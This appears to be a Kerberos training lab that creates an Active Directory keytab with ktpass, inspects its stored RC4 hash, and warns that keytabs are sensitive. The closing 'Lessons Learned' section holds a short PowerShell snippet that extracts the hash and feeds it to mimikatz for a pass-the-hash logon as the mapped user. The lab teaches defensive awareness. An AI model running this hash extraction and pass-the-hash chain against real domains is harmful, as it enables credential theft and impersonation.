# Kerberos 101 Labs

## Create a keytab and inspect it

In this lab you will create a Keytab file. We are not be able to use it for something as Windows does not use Keytab files. Linux machines use Keytab files to authenticate with a Windows Active Directory domain.

In the Linux world or non-Microsoft Kerberos world, Keytab files very similar to the Windows trust relationship. When creating a keytab file, the password hash is stored in the on the given account in the KDC's database as well as the Keytab file.

:ballot_box_with_check: Logon to the machine `KerbClient2`.

:ballot_box_with_check: Create a new account in Active Directory and a Keytab file that that account.

```powershell
$ou = New-ADOrganizationalUnit -Name KeyTabTests -PassThru
New-ADUser -Name User1 -Path $ou

ktpass /out c:\krb5.keytab /princ http/SomeWebServer.a.vm.net$@a.vm.net /mapuser User1 /crypto RC4-HMAC-NT /ptype KRB5_NT_PRINCIPAL /pass Somepass2 /target KerbDC2.a.vm.net
```

Even if we cannot use the Keytab file, it is quite interesting to look at it. We can read the Keytab file with `ktpass.exe`.

:ballot_box_with_check: Open the Keytab file suing the following command:

```powershell
ktpass.exe /in C:\krb5.keytab
```

The output looks like this:

```text
Existing keytab:

Keytab version: 0x502
keysize 49 User1$@a.vm.net ptype 1 (KRB5_NT_PRINCIPAL) vno 3 etype 0x17 (RC4-HMAC) keylength 16 (0x39adbe3fcd45600a31b9ee56122b4a87)

WARNING: No principal name specified.
```

:question: Do you see any critical information in the output?

:question: How careful / secure should Keytab files be treated?

<details><summary><h2>Lessons Learned</h2></summary>

:bulb: Kerberos Keytab files are the equivilant to a Windows trust relationship.

:bulb: Because of that, the Keytab file stores the generated password hash which makes it pretty sensitive.

:warning: If someone has access to the Keytab file, using the hash to act as the user the Keytab file is mapped to, it quite easy:

```powershell
$keytab = ktpass.exe /in C:\krb5.keytab 2>&1
$keytab = -join $keytab 

$keytab -match '\(0x(?<Hash>[a-z0-9]+)\)'
$Matches.Hash

C:\mimikatz\x64\mimikatz.exe "sekurlsa::pth /user:install /domain:a /ntlm:$($Matches.Hash) /run:powershell" exit
```

</details>
